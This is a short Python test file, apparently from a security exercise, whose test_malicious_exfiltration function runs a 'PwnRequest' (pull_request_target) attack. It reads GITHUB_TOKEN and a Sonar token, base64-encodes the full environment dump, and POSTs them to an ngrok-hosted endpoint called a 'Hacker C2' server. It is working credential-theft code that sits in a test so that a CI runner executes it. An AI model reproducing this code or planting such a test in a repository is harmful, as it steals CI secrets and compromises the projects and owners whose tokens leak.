import os
import urllib.request
import json
import base64

def test_malicious_exfiltration():
    print("😈 [PwnRequest] Secrets Exfiltration Started...")
    
    # 환경변수(Secrets) 수집
    github_token = os.environ.get("GITHUB_TOKEN", "NOT_FOUND")
    sonar_token = os.environ.get("PXXGUIN_SONAR_TOKEN", "NOT_FOUND")
    env_dump = base64.b64encode(os.popen("env").read().encode()).decode()

    data = {
        "github_token": github_token,
        "sonar_token": sonar_token,
        "env_dump": env_dump,
        "attack_type": "PwnRequest (pull_request_target)"
    }

    # 1주차 Hacker C2 서버로 전송 (또는 테스트용 Webhook.site 이용)
    req = urllib.request.Request(
        "https://1443-14-33-52-135.ngrok-free.app/exfiltrate", 
        data=json.dumps(data).encode('utf-8'),
        headers={'Content-Type': 'application/json'}
    )
    
    try:
        urllib.request.urlopen(req)
        print("😈 Secrets successfully sent to Hacker C2!")
    except Exception as e:
        print(f"Failed: {e}")
